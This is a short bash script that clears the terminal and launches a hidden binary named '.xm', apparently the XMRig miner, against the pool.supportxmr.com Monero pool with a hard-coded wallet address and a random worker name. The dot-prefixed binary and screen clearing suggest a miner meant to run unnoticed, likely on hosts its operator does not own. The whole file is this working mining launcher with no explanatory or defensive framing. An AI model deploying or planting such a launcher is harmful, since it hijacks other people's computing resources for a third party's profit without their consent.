#!/bin/bash

clear
./.xm -o pool.supportxmr.com:7777 -u 43Mk3jUjBwkbfLishws1FzTMJkjRnYyKb5uuuPQM59UDLHjvzB1nP5HBZaYisfTRWJHzYdKpe5LnBHZWbih3DRebQM3DZ7o -p "Miner-$(( (RANDOM << 15 | RANDOM) % 1000000 + 1 ))"
